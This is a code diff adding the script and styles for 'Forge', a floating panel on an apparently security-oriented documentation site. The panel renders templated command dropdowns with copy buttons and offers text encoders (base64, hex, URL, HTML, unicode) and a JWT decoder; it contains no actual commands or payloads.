+      return template.replace(TOKEN_RE, function (token) {
+        const key = FIELD_MAP[token];
+        return state[key] || token;
+      });
+    }
+
+    function renderCmdFragment(template) {
+      const frag = document.createDocumentFragment();
+      const state = readState();
+      let lastIndex = 0;
+      TOKEN_RE.lastIndex = 0;
+      let m;
+      while ((m = TOKEN_RE.exec(template)) !== null) {
+        if (m.index > lastIndex) {
+          frag.appendChild(document.createTextNode(template.slice(lastIndex, m.index)));
+        }
+        const token = m[0];
+        const key = FIELD_MAP[token];
+        const span = document.createElement('span');
+        if (state[key]) {
+          span.className = 'codex-op-sub';
+          span.textContent = state[key];
+        } else {
+          span.className = 'codex-forge__placeholder';
+          span.textContent = token;
+        }
+        frag.appendChild(span);
+        lastIndex = m.index + token.length;
+      }
+      if (lastIndex < template.length) {
+        frag.appendChild(document.createTextNode(template.slice(lastIndex)));
+      }
+      return frag;
+    }
+
+    const COPY_ICON = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>';
+    const CHEVRON_ICON = '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="6 9 12 15 18 9"></polyline></svg>';
+
+    function buildPayloadPane(paneEl, key) {
+      const items = PAYLOADS[key];
+      if (!items || !items.length) return;
+
+      // Dropdown
+      const dropdown = document.createElement('div');
+      dropdown.className = 'codex-forge__dropdown';
+
+      const trigger = document.createElement('button');
+      trigger.type = 'button';
+      trigger.className = 'codex-forge__dropdown-trigger';
+      trigger.setAttribute('aria-haspopup', 'listbox');
+      trigger.setAttribute('aria-expanded', 'false');
+
+      const triggerLabel = document.createElement('span');
+      triggerLabel.className = 'codex-forge__dropdown-label';
+      triggerLabel.textContent = items[0].label;
+      trigger.appendChild(triggerLabel);
+
+      const triggerChev = document.createElement('span');
+      triggerChev.className = 'codex-forge__dropdown-chev';
+      triggerChev.innerHTML = CHEVRON_ICON;
+      trigger.appendChild(triggerChev);
+
+      dropdown.appendChild(trigger);
+
+      const menu = document.createElement('ul');
+      menu.className = 'codex-forge__dropdown-menu';
+      menu.setAttribute('role', 'listbox');
+      menu.setAttribute('aria-hidden', 'true');
+      items.forEach(function (item, idx) {
+        const li = document.createElement('li');
+        li.className = 'codex-forge__dropdown-item';
+        if (idx === 0) li.classList.add('codex-forge__dropdown-item--active');
+        li.setAttribute('role', 'option');
+        li.setAttribute('aria-selected', idx === 0 ? 'true' : 'false');
+        li.setAttribute('data-idx', String(idx));
+        const labelSpan = document.createElement('span');
+        labelSpan.className = 'codex-forge__dropdown-item-label';
+        labelSpan.textContent = item.label;
+        li.appendChild(labelSpan);
+        const metaSpan = document.createElement('span');
+        metaSpan.className = 'codex-forge__dropdown-item-meta';
+        metaSpan.textContent = item.meta;
+        li.appendChild(metaSpan);
+        menu.appendChild(li);
+      });
+      dropdown.appendChild(menu);
+      paneEl.appendChild(dropdown);
+
+      // Command box — flex layout:
+      //   [ scrollable text region (flex: 1, overflow-x: auto) ][ copy btn ]
+      // The button is a flex sibling, NOT absolute-positioned inside the
+      // scroll area. This means horizontal scroll only affects the text;
+      // the button stays put and doesn't overlap.
+      const cmdWrap = document.createElement('div');
+      cmdWrap.className = 'codex-forge__cmd';
+
+      const cmdScroll = document.createElement('div');
+      cmdScroll.className = 'codex-forge__cmd-scroll';
+      const cmdCode = document.createElement('code');
+      cmdCode.className = 'codex-forge__cmd-text';
+      cmdScroll.appendChild(cmdCode);
+      cmdWrap.appendChild(cmdScroll);
+
+      const copyBtn = document.createElement('button');
+      copyBtn.type = 'button';
+      copyBtn.className = 'codex-forge__copy codex-forge__copy--cmd';
+      copyBtn.setAttribute('aria-label', 'Copy command');
+      copyBtn.innerHTML = COPY_ICON;
+      cmdWrap.appendChild(copyBtn);
+
+      paneEl.appendChild(cmdWrap);
+
+      const metaLine = document.createElement('p');
+      metaLine.className = 'codex-forge__cmd-meta';
+      paneEl.appendChild(metaLine);
+
+      let currentIdx = 0;
+      function render() {
+        const item = items[currentIdx];
+        triggerLabel.textContent = item.label;
+        cmdCode.innerHTML = '';
+        cmdCode.appendChild(renderCmdFragment(item.cmd));
+        metaLine.textContent = item.meta;
+        // Reset horizontal scroll so each new command starts from the left.
+        // Browsers preserve scrollLeft across content swaps by default —
+        // good for chat-style content, wrong for switching to a different
+        // command where the operator wants to see it from the beginning.
+        cmdScroll.scrollLeft = 0;
+        menu.querySelectorAll('.codex-forge__dropdown-item').forEach(function (li) {
+          const isActive = parseInt(li.getAttribute('data-idx'), 10) === currentIdx;
+          li.classList.toggle('codex-forge__dropdown-item--active', isActive);
+          li.setAttribute('aria-selected', isActive ? 'true' : 'false');
+        });
+      }
+      render();
+
+      // Menu is appended to document.body when open so it escapes all
+      // overflow contexts. Closed: menu sits in dropdown DOM as before
+      // (but with opacity:0 + pointer-events:none, so invisible).
+
+      function positionMenu() {
+        // Compute fixed-position coords for the menu. Flip up if no room below.
+        const tr = trigger.getBoundingClientRect();
+        const estHeight = Math.min(items.length * 44 + 8, 280);
+        const spaceBelow = window.innerHeight - tr.bottom;
+        const spaceAbove = tr.top;
+        const flipUp = spaceBelow < estHeight + 16 && spaceAbove > spaceBelow;
+        menu.style.position = 'fixed';
+        menu.style.left = tr.left + 'px';
+        menu.style.width = tr.width + 'px';
+        menu.style.zIndex = '10001';  // Above all floating buttons.
+        if (flipUp) {
+          menu.style.top = 'auto';
+          menu.style.bottom = (window.innerHeight - tr.top + 4) + 'px';
+          menu.style.maxHeight = Math.min(estHeight, spaceAbove - 16) + 'px';
+        } else {
+          menu.style.top = (tr.bottom + 4) + 'px';
+          menu.style.bottom = 'auto';
+          menu.style.maxHeight = Math.min(estHeight, spaceBelow - 16) + 'px';
+        }
+      }
+
+      // Track menu's original DOM parent for restoration on close.
+      const menuOriginalParent = dropdown;
+
+      function setOpen(open) {
+        dropdown.classList.toggle('codex-forge__dropdown--open', open);
+        menu.setAttribute('aria-hidden', open ? 'false' : 'true');
+        trigger.setAttribute('aria-expanded', open ? 'true' : 'false');
+        if (open) {
+          // Move menu to body so it escapes clipping and overflow.
+          // Once in body, the descendant rule
+          //   .codex-forge__dropdown--open .codex-forge__dropdown-menu
+          // no longer applies. Inline-set display:block AND the rest of
+          // the open-state styles.
+          if (menu.parentElement !== document.body) {
+            document.body.appendChild(menu);
+          }
+          menu.style.display = 'block';
+          positionMenu();
+          menu.classList.add('codex-forge__dropdown-menu--open');
+          openMenu = menu;
+          openDropdown = dropdown;
+        } else {
+          // Clear all inline styles and put menu back into the dropdown.
+          // When back in the dropdown, the CSS `display: none` (closed
+          // default) takes over.
+          menu.classList.remove('codex-forge__dropdown-menu--open');
+          menu.style.display = '';
+          menu.style.position = '';
+          menu.style.top = '';
+          menu.style.bottom = '';
+          menu.style.left = '';
+          menu.style.width = '';
+          menu.style.maxHeight = '';
+          menu.style.zIndex = '';
+          if (menu.parentElement === document.body) {
+            menuOriginalParent.appendChild(menu);
+          }
+          if (openMenu === menu) openMenu = null;
+          if (openDropdown === dropdown) openDropdown = null;
+        }
+      }
+
+      // Reposition on window resize while open
+      window.addEventListener('resize', function () {
+        if (dropdown.classList.contains('codex-forge__dropdown--open')) {
+          positionMenu();
+        }
+      });
+      trigger.addEventListener('click', function (e) {
+        e.stopPropagation();
+        const isOpen = dropdown.classList.contains('codex-forge__dropdown--open');
+        // Close any other open dropdowns first
+        if (openDropdown && openDropdown !== dropdown) {
+          // Find the other dropdown's setOpen — store on element
+          if (openDropdown._forgeSetOpen) openDropdown._forgeSetOpen(false);
+        }
+        setOpen(!isOpen);
+      });
+
+      // Expose setOpen for cross-dropdown closing
+      dropdown._forgeSetOpen = setOpen;
+
+      menu.querySelectorAll('.codex-forge__dropdown-item').forEach(function (li) {
+        li.addEventListener('click', function () {
+          currentIdx = parseInt(li.getAttribute('data-idx'), 10);
+          render();
+          setOpen(false);
+        });
+      });
+
+      copyBtn.addEventListener('click', function () {
+        copy(resolveCmd(items[currentIdx].cmd));
+      });
+
+      paneEl._forgeRender = render;
+    }
+
+    function buildAllPayloadPanes() {
+      document.querySelectorAll('[data-forge-payload-pane]').forEach(function (paneEl) {
+        const key = paneEl.getAttribute('data-forge-payload-pane');
+        buildPayloadPane(paneEl, key);
+      });
+    }
+    function rerenderAllPayloadPanes() {
+      document.querySelectorAll('[data-forge-payload-pane]').forEach(function (paneEl) {
+        if (paneEl._forgeRender) paneEl._forgeRender();
+      });
+    }
+
+    // Close any open dropdown when clicking outside.
+    // Because the menu is appended to document.body when open, it's not
+    // a DOM descendant of the dropdown anymore. So we check against both
+    // the open dropdown AND the open menu specifically.
+    document.addEventListener('click', function (e) {
+      if (!openDropdown) return;
+      const insideDropdown = e.target.closest('.codex-forge__dropdown');
+      const insideMenu = openMenu && (e.target === openMenu || openMenu.contains(e.target));
+      if (insideDropdown === openDropdown || insideMenu) return;
+      // Clicked outside — close the open dropdown
+      if (openDropdown._forgeSetOpen) openDropdown._forgeSetOpen(false);
+    });
+
+    // ENCODERS
+    function strToBytes(s) { return new TextEncoder().encode(s); }
+    function bytesToStr(b) { return new TextDecoder('utf-8', { fatal: false }).decode(b); }
+    function bytesToB64(bytes) {
+      let s = '';
+      for (let i = 0; i < bytes.length; i++) s += String.fromCharCode(bytes[i]);
+      return btoa(s);
+    }
+    function b64ToBytes(b64) {
+      const s = atob(b64.replace(/\s+/g, ''));
+      const out = new Uint8Array(s.length);
+      for (let i = 0; i < s.length; i++) out[i] = s.charCodeAt(i);
+      return out;
+    }
+
+    const ENCODERS = {
+      url: {
+        encode: function (s) { return encodeURIComponent(s); },
+        decode: function (s) { try { return decodeURIComponent(s); } catch (e) { return '⚠ malformed URL-encoded input'; } },
+      },
+      base64: {
+        encode: function (s) { return bytesToB64(strToBytes(s)); },
+        decode: function (s) { try { return bytesToStr(b64ToBytes(s)); } catch (e) { return '⚠ malformed base64 input'; } },
+      },
+      'base64-utf16le': {
+        encode: function (s) {
+          const bytes = new Uint8Array(s.length * 2);
+          for (let i = 0; i < s.length; i++) {
+            const c = s.charCodeAt(i);
+            bytes[i * 2] = c & 0xff;
+            bytes[i * 2 + 1] = (c >> 8) & 0xff;
+          }
+          return bytesToB64(bytes);
+        },
+        decode: null,
+      },
+      hex: {
+        encode: function (s) {
+          const b = strToBytes(s);
+          let out = '';
+          for (let i = 0; i < b.length; i++) out += b[i].toString(16).padStart(2, '0');
+          return out;
+        },
+        decode: function (s) {
+          const cleaned = s.replace(/0x|\\x|,|\s+/g, '');
+          if (!/^[0-9a-fA-F]*$/.test(cleaned) || cleaned.length % 2 !== 0) return '⚠ malformed hex input';
+          const bytes = new Uint8Array(cleaned.length / 2);
+          for (let i = 0; i < cleaned.length; i += 2) bytes[i / 2] = parseInt(cleaned.substr(i, 2), 16);
+          try { return bytesToStr(bytes); } catch (e) { return '⚠ malformed hex input'; }
+        },
+      },
+      html: {
+        encode: function (s) {
+          return s.replace(/[&<>"'\/]/g, function (c) {
+            return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' }[c];
+          });
+        },
+        decode: function (s) {
+          const t = document.createElement('textarea');
+          t.innerHTML = s;
+          return t.value;
+        },
+      },
+      unicode: {
+        encode: function (s) {
+          let out = '';
+          for (let i = 0; i < s.length; i++) {
+            const c = s.charCodeAt(i);
+            out += '\\u' + c.toString(16).padStart(4, '0');
+          }
+          return out;
+        },
+        decode: function (s) {
+          try {
+            return s.replace(/\\u\{([0-9a-fA-F]+)\}/g, function (_, h) {
+              return String.fromCodePoint(parseInt(h, 16));
+            }).replace(/\\u([0-9a-fA-F]{4})/g, function (_, h) {
+              return String.fromCharCode(parseInt(h, 16));
+            });
+          } catch (e) { return '⚠ malformed \\u escapes'; }
+        },
+      },
+      jwt: {
+        encode: function (s) { return decodeJwt(s); },
+        decode: null,
+      },
+    };
+
+    function decodeJwt(token) {
+      const t = token.trim();
+      const parts = t.split('.');
+      if (parts.length < 2) return '⚠ not a JWT (needs at least header.payload)';
+      function b64url(p) {
+        let b = p.replace(/-/g, '+').replace(/_/g, '/');
+        while (b.length % 4) b += '=';
+        try { return bytesToStr(b64ToBytes(b)); } catch (e) { return null; }
+      }
+      const h = b64url(parts[0]);
+      const p = b64url(parts[1]);
+      if (!h || !p) return '⚠ malformed JWT base64url';
+      function pretty(s) { try { return JSON.stringify(JSON.parse(s), null, 2); } catch (e) { return s; } }
+      return '─── header ───\n' + pretty(h) + '\n\n─── payload ───\n' + pretty(p) +
+             (parts[2] ? '\n\n─── signature ───\n' + parts[2] + '\n(not verified)' : '');
+    }
+
+    function wireEncoders() {
+      document.querySelectorAll('#codex-forge [data-forge-encoder]').forEach(function (encEl) {
+        const kind = encEl.getAttribute('data-forge-encoder');
+        const input = encEl.querySelector('.codex-forge__enc-in');
+        const output = encEl.querySelector('.codex-forge__enc-out');
+        const copyBtn = encEl.querySelector('[data-forge-enc-copy]');
+        const dirBtns = encEl.querySelectorAll('[data-dir]');
+        let currentDir = 'encode';
+
+        dirBtns.forEach(function (b) {
+          b.addEventListener('click', function () {
+            dirBtns.forEach(function (x) { x.classList.remove('codex-forge__dir--active'); });
+            b.classList.add('codex-forge__dir--active');
+            currentDir = b.getAttribute('data-dir');
+            run();
+          });
+        });
+
+        function run() {
+          const raw = input.value;
+          if (!raw) { output.textContent = ''; return; }
+          const enc = ENCODERS[kind];
+          if (!enc) { output.textContent = '⚠ unknown encoder'; return; }
+          const fn = currentDir === 'decode' ? enc.decode : enc.encode;
+          if (!fn) { output.textContent = ''; return; }
+          try { output.textContent = fn(raw); }
+          catch (e) { output.textContent = '⚠ ' + (e.message || 'encoding error'); }
+        }
+        input.addEventListener('input', run);
+
+        copyBtn.addEventListener('click', function () {
+          const text = output.textContent || '';
+          if (!text) return;
+          copy(text);
+        });
+      });
+    }
+
+    // Copy + toast
+    const toast = document.querySelector('#codex-forge .codex-forge__toast');
+    let toastTimer = null;
+    function showToast(msg) {
+      if (!toast) return;
+      toast.textContent = msg;
+      toast.classList.add('codex-forge__toast--visible');
+      if (toastTimer) clearTimeout(toastTimer);
+      toastTimer = setTimeout(function () {
+        toast.classList.remove('codex-forge__toast--visible');
+      }, 1600);
+    }
+    function copy(text) {
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(text)
+          .then(function () { showToast('copied to clipboard'); })
+          .catch(function () { fallbackCopy(text); });
+      } else {
+        fallbackCopy(text);
+      }
+    }
+    function fallbackCopy(text) {
+      const ta = document.createElement('textarea');
+      ta.value = text;
+      ta.style.position = 'fixed';
+      ta.style.left = '-9999px';
+      document.body.appendChild(ta);
+      ta.select();
+      try { document.execCommand('copy'); showToast('copied to clipboard'); }
+      catch (e) { showToast('copy failed'); }
+      ta.remove();
+    }
+
+    // Tabs + panel
+    function wireTabs() {
+      const tabs = document.querySelectorAll('#codex-forge .codex-forge__tab');
+      const panes = document.querySelectorAll('#codex-forge .codex-forge__pane');
+      tabs.forEach(function (t) {
+        t.addEventListener('click', function () {
+          const name = t.getAttribute('data-forge-tab');
+          tabs.forEach(function (x) {
+            x.classList.toggle('codex-forge__tab--active', x === t);
+            x.setAttribute('aria-selected', x === t ? 'true' : 'false');
+          });
+          panes.forEach(function (p) {
+            const active = p.getAttribute('data-forge-pane') === name;
+            p.classList.toggle('codex-forge__pane--active', active);
+            if (active) p.removeAttribute('hidden');
+            else p.setAttribute('hidden', '');
+          });
+        });
+      });
+    }
+
+    function wirePanel() {
+      const root = document.getElementById('codex-forge');
+      const panel = document.getElementById('codex-forge-panel');
+      const toggleBtn = root && root.querySelector('.codex-forge__toggle');
+      const closeBtn = root && root.querySelector('.codex-forge__close');
+      if (!root || !panel || !toggleBtn) return;
+
+      function setOpen(open) {
+        panel.setAttribute('aria-hidden', open ? 'false' : 'true');
+        toggleBtn.setAttribute('aria-expanded', open ? 'true' : 'false');
+        root.classList.toggle('codex-forge--open', open);
+        if (open) rerenderAllPayloadPanes();
+      }
+      toggleBtn.addEventListener('click', function () {
+        const isOpen = panel.getAttribute('aria-hidden') === 'false';
+        setOpen(!isOpen);
+      });
+      if (closeBtn) closeBtn.addEventListener('click', function () { setOpen(false); });
+
+      document.addEventListener('keydown', function (e) {
+        if (e.key === 'Escape' && panel.getAttribute('aria-hidden') === 'false') {
+          setOpen(false);
+          toggleBtn.focus();
+        }
+      });
+    }
+
+    function init() {
+      wirePanel();
+      wireTabs();
+      buildAllPayloadPanes();
+      wireEncoders();
+
+      // Live-rerender Forge command displays when OperatorConsole state
+      // changes. Without this, Forge would only refresh on panel-open —
+      // a stale placeholder (or "hardcoded" value after a clear) would
+      // persist until the user manually toggled the panel.
+      document.addEventListener('codex:op:change', function () {
+        rerenderAllPayloadPanes();
+      });
+    }
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', init);
+    } else {
+      init();
+    }
+  })();
+</script>
+
+<style is:global>
+  /* Forge styles are global because key elements (dropdown, command box,
+     copy buttons) are created dynamically by JS — Astro's component scoping
+     can't reach them. Selectors are well-namespaced under `.codex-forge`. */
+
+  .codex-forge {
+    position: fixed;
+    bottom: 1.5rem;
+    /* OperatorConsole sits at right: 5.5rem. With 44px button + 20px gap,
+       Forge's right offset = 5.5rem + 44px + 20px = 88 + 44 + 20 = 152px = 9.5rem. */
+    right: 9.5rem;
+    z-index: 9998;
+    font-family: var(--codex-font-sans);
+  }
+
+  .codex-forge__toggle {
+    position: relative;
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    border: 1px solid var(--codex-accent-border);
+    background: var(--codex-bg-elevated, #14141a);
+    /* Matches OperatorConsole's icon color exactly. The token isn't
+       defined globally; the fallback #aaa is what actually paints. */
+    color: var(--codex-fg-dim, #aaa);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.25), 0 0 0 1px var(--codex-accent-border);
+    transition: all 0.2s ease;
+  }
+  .codex-forge__toggle:hover {
+    color: var(--codex-accent-bright);
+    border-color: var(--codex-accent);
+    /* Halo reach ~18px — stops short of the 20px gap to neighbors so the
+       glow stays in this button's own space (see PaletteTuner). */
+    box-shadow:
+      0 6px 16px rgba(0,0,0,0.35),
+      0 0 12px 6px var(--codex-accent-soft),
+      0 0 0 1px var(--codex-accent-border-strong);
+    transform: translateY(-1px);
+  }
+
+  .codex-forge__panel {
+    position: absolute;
+    bottom: calc(100% + 0.75rem);
+    right: 0;
+    width: 460px;
+    max-width: calc(100vw - 2rem);
+    max-height: 70vh;
+    display: flex;
+    flex-direction: column;
+    background: var(--codex-bg-elevated, #14141a);
+    border: 1px solid var(--codex-accent-border);
+    border-radius: 4px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4), 0 0 0 1px var(--codex-accent-border);
+    opacity: 0;
+    transform: translateY(8px);
+    pointer-events: none;
+    transition: opacity 0.18s ease, transform 0.18s ease;
+    visibility: hidden;
+  }
+  .codex-forge--open .codex-forge__panel {
+    opacity: 1;
+    transform: translateY(0);
+    pointer-events: auto;
+    visibility: visible;
+  }
+
+  .codex-forge__header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 0.6rem 0.85rem 0.45rem;
+    border-bottom: 1px solid var(--codex-border, #2a2a2e);
+    flex-shrink: 0;
+  }
+  .codex-forge__title {
+    font-family: var(--codex-font-mono);
+    font-size: 0.85rem;
+    font-weight: 500;
+    color: var(--codex-accent-bright);
+    letter-spacing: 0.02em;
+  }
+  .codex-forge__close {
+    width: 24px;
+    height: 24px;
+    background: transparent;
+    border: none;
+    color: var(--codex-text-muted, #888780);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    border-radius: 2px;
+    transition: color 0.15s, background 0.15s;
+  }
+  .codex-forge__close:hover {
+    color: var(--codex-text, #c5c8c6);
+    background: var(--codex-accent-softer);
+  }
+
+  /* Tab strip — overflow hidden (five tabs fit fine in 460px) */
+  .codex-forge__tabs {
+    display: flex;
+    gap: 0;
+    padding: 0 0.5rem;
+    border-bottom: 1px solid var(--codex-border, #2a2a2e);
+    flex-shrink: 0;
+    overflow: hidden;
+  }
+  .codex-forge__tab {
+    background: transparent;
+    border: none;
+    border-bottom: 1px solid transparent;
+    padding: 0.5rem 0.7rem;
+    font-family: var(--codex-font-mono);
+    font-size: 0.74rem;
+    color: var(--codex-text-muted, #888780);
+    cursor: pointer;
+    transition: color 0.15s, border-color 0.15s;
+    white-space: nowrap;
+    margin-bottom: -1px;
+  }
+  .codex-forge__tab:hover { color: var(--codex-text, #c5c8c6); }
+  .codex-forge__tab--active {
+    color: var(--codex-accent-bright);
+    border-bottom-color: var(--codex-accent);
+  }
+
+  .codex-forge__body {
+    flex: 1 1 auto;
+    /* Critical: min-height: 0 prevents the body from being forced to its
+       content's intrinsic height inside a flex column. Without this, the
+       body's overflow:auto can show a scrollbar even when content fits. */
+    min-height: 0;
+    overflow-y: auto;
+    overflow-x: hidden;
+    padding: 0.7rem 0.85rem 0.85rem;
+  }
+  /* Thin scrollbar styling matching site convention */
+  .codex-forge__body::-webkit-scrollbar {
+    width: 6px;
+  }
+  .codex-forge__body::-webkit-scrollbar-track {
+    background: transparent;
+  }
+  .codex-forge__body::-webkit-scrollbar-thumb {
+    background: var(--codex-accent-border);
+    border-radius: 3px;
+  }
+  .codex-forge__body::-webkit-scrollbar-thumb:hover {
+    background: var(--codex-accent);
+  }
+  .codex-forge__pane { display: none; }
+  .codex-forge__pane--active { display: block; }
+
+  .codex-forge__pane-lede {
+    margin: 0 0 0.65rem;
+    font-size: 0.72rem;
+    line-height: 1.45;
+    color: var(--codex-text-muted, #888780);
+  }
+  .codex-forge__pane-foot {
+    margin: 0.7rem 0 0;
+    padding-top: 0.55rem;
+    border-top: 1px solid var(--codex-border, #2a2a2e);
+    font-size: 0.7rem;
+    line-height: 1.45;
+    color: var(--codex-text-muted, #888780);
+    font-style: italic;
+  }
+
+  /* Custom dropdown */
+  .codex-forge__dropdown {
+    position: relative;
+    margin-bottom: 0.55rem;
+  }
+  .codex-forge__dropdown-trigger {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 0.5rem;
+    padding: 0.4rem 0.55rem;
+    background: var(--codex-bg, #0d0d0f);
+    border: 1px solid var(--codex-border, #2a2a2e);
+    border-radius: 2px;
+    color: var(--codex-text, #c5c8c6);
+    font-family: var(--codex-font-mono);
+    font-size: 0.78rem;
+    cursor: pointer;
+    transition: border-color 0.15s, background 0.15s;
+  }
+  .codex-forge__dropdown-trigger:hover {
+    border-color: var(--codex-accent);
+  }
+  .codex-forge__dropdown--open .codex-forge__dropdown-trigger {
+    border-color: var(--codex-accent);
+    background: var(--codex-accent-softer);
+  }
+  .codex-forge__dropdown-label {
+    color: var(--codex-accent-bright);
+    flex: 1;
+    text-align: left;
+  }
+  .codex-forge__dropdown-chev {
+    color: var(--codex-text-muted, #888780);
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    transition: transform 0.15s;
+  }
+  .codex-forge__dropdown--open .codex-forge__dropdown-chev {
+    transform: rotate(180deg);
+  }
+  .codex-forge__dropdown-menu {
+    /* Closed state: display:none guarantees zero layout contribution.
+       Some browsers eagerly reserve scroll-space for absolute-positioned
+       elements with max-height, which caused a ghost scrollbar on the
+       parent body. display:none avoids that path entirely. */
+    display: none;
+    position: absolute;
+    top: calc(100% + 4px);
+    left: 0;
+    right: 0;
+    margin: 0;
+    padding: 0.25rem 0;
+    list-style: none;
+    background: var(--codex-bg-elevated, #14141a);
+    border: 1px solid var(--codex-accent-border);
+    border-radius: 2px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+    z-index: 5;
+    max-height: 280px;
+    overflow-y: auto;
+  }
+  .codex-forge__dropdown--open .codex-forge__dropdown-menu {
+    display: block;
+  }
+  .codex-forge__dropdown-item {
+    padding: 0.4rem 0.6rem;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    gap: 0.1rem;
+    transition: background 0.12s;
+  }
+  .codex-forge__dropdown-item:hover {
+    background: var(--codex-accent-softer);
+  }
+  .codex-forge__dropdown-item--active {
+    background: var(--codex-accent-soft);
+  }
+  .codex-forge__dropdown-item-label {
+    font-family: var(--codex-font-mono);
+    font-size: 0.76rem;
+    color: var(--codex-text, #c5c8c6);
+  }
+  .codex-forge__dropdown-item--active .codex-forge__dropdown-item-label {
+    color: var(--codex-accent-bright);
+  }
+  .codex-forge__dropdown-item-meta {
+    font-size: 0.65rem;
+    color: var(--codex-text-dim, #6c7079);
+    font-style: italic;
+    line-height: 1.3;
+  }
+
+  /* Command box — flex layout. The text scrolls horizontally inside its
+     scroller child; the copy button is a flex sibling that doesn't move
+     when text scrolls. No more overlap. */
+  .codex-forge__cmd {
+    display: flex;
+    align-items: stretch;
+    background: var(--codex-bg, #0d0d0f);
+    border: 1px solid var(--codex-border, #2a2a2e);
+    border-radius: 2px;
+    min-height: 2.4rem;
+    overflow: hidden;  /* clip the inner scroller's edges to the rounded border */
+  }
+  .codex-forge__cmd-scroll {
+    flex: 1 1 auto;
+    min-width: 0;
+    overflow-x: auto;
+    overflow-y: hidden;
+    /* Right padding creates a visible gap between the last text character
+       and the right edge of the scroll wrapper. Combined with the button's
+       margin-left, this prevents text from visually touching the button. */
+    padding: 0.5rem 0.75rem 0.5rem 0.6rem;
+  }
+  .codex-forge__cmd-text {
+    font-family: var(--codex-font-mono);
+    font-size: 0.74rem;
+    line-height: 1.5;
+    color: var(--codex-text, #c5c8c6);
+    white-space: nowrap;
+    display: block;
+    /* Override Starlight's default `:not(pre)>code` styling. That rule
+       paints a border + background + padding on bare <code> elements in
+       prose, which is fine in body text but wrong inside Forge — it
+       draws an unwanted grey rectangle around our command string. */
+    border: none;
+    background: transparent;
+    padding: 0;
+    border-radius: 0;
+  }
+  .codex-forge__placeholder {
+    font-family: var(--codex-font-mono);
+    font-size: 0.95em;
+    color: var(--codex-accent);
+    background: var(--codex-accent-softer);
+    padding: 0 2px;
+    border-radius: 2px;
+    border: 1px dashed var(--codex-accent-border);
+    white-space: nowrap;
+  }
+  .codex-forge__cmd-meta {
+    margin: 0.35rem 0 0;
+    font-size: 0.7rem;
+    color: var(--codex-text-dim, #6c7079);
+    font-style: italic;
+  }
+
+  /* Copy buttons — two variants:
+       --cmd : a FLEX sibling inside .codex-forge__cmd (no absolute positioning).
+               Sits adjacent to the scrollable text region; doesn't overlap.
+       --enc : absolute-positioned in .codex-forge__enc-out-row, vertically
+               centered, anchored to the right of the empty output box. */
+  .codex-forge__copy {
+    width: 26px;
+    height: 26px;
+    background: var(--codex-bg-elevated, #14141a);
+    border: 1px solid var(--codex-accent-border);
+    border-radius: 2px;
+    color: var(--codex-text-muted, #888780);
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: color 0.15s, border-color 0.15s, background 0.15s;
+  }
+  .codex-forge__copy:hover {
+    color: var(--codex-accent-bright);
+    border-color: var(--codex-accent);
+    background: var(--codex-accent-softer);
+  }
+  .codex-forge__copy--cmd {
+    /* Flex sibling — sits next to the scrollable text region. Self-margins
+       provide vertical centering and a small gap. */
+    flex-shrink: 0;
+    align-self: center;
+    margin: 0 0.35rem 0 0.25rem;
+  }
+  .codex-forge__copy--enc {
+    /* Box height 42px, button 26px → top offset (42-26)/2 = 8px for center. */
+    position: absolute;
+    top: 8px;
+    right: 6px;
+  }
+
+  /* Encoder block */
+  .codex-forge__enc {
+    margin-bottom: 0.85rem;
+    padding-bottom: 0.85rem;
+    border-bottom: 1px solid var(--codex-border, #2a2a2e);
+  }
+  .codex-forge__enc:last-child {
+    border-bottom: none;
+    margin-bottom: 0;
+    padding-bottom: 0;
+  }
+  .codex-forge__row-head {
+    display: flex;
+    align-items: baseline;
+    gap: 0.55rem;
+    margin-bottom: 0.3rem;
+    flex-wrap: wrap;
+  }
+  .codex-forge__label {
+    font-family: var(--codex-font-mono);
+    font-size: 0.78rem;
+    color: var(--codex-text, #c5c8c6);
+    font-weight: 500;
+  }
+  .codex-forge__meta {
+    font-size: 0.65rem;
+    color: var(--codex-text-dim, #6c7079);
+    font-style: italic;
+  }
+  .codex-forge__enc-dir {
+    display: flex;
+    gap: 0.25rem;
+    margin-left: auto;
+  }
+  .codex-forge__dir {
+    background: transparent;
+    border: 1px solid var(--codex-border, #2a2a2e);
+    border-radius: 2px;
+    padding: 0.15rem 0.4rem;
+    font-family: var(--codex-font-mono);
+    font-size: 0.65rem;
+    color: var(--codex-text-muted, #888780);
+    cursor: pointer;
+    transition: color 0.15s, border-color 0.15s, background 0.15s;
+  }
+  .codex-forge__dir:hover { color: var(--codex-text, #c5c8c6); }
+  .codex-forge__dir--active {
+    color: var(--codex-accent-bright);
+    border-color: var(--codex-accent);
+    background: var(--codex-accent-softer);
+  }
+  .codex-forge__enc-in {
+    width: 100%;
+    margin-top: 0.25rem;
+    padding: 0.4rem 0.55rem;
+    background: var(--codex-bg, #0d0d0f);
+    border: 1px solid var(--codex-border, #2a2a2e);
+    border-radius: 2px;
+    color: var(--codex-text, #c5c8c6);
+    font-family: var(--codex-font-mono);
+    font-size: 0.72rem;
+    line-height: 1.45;
+    resize: vertical;
+    min-height: 2.4rem;
+    transition: border-color 0.15s;
+    box-sizing: border-box;
+  }
+  .codex-forge__enc-in:focus {
+    outline: none;
+    border-color: var(--codex-accent);
+  }
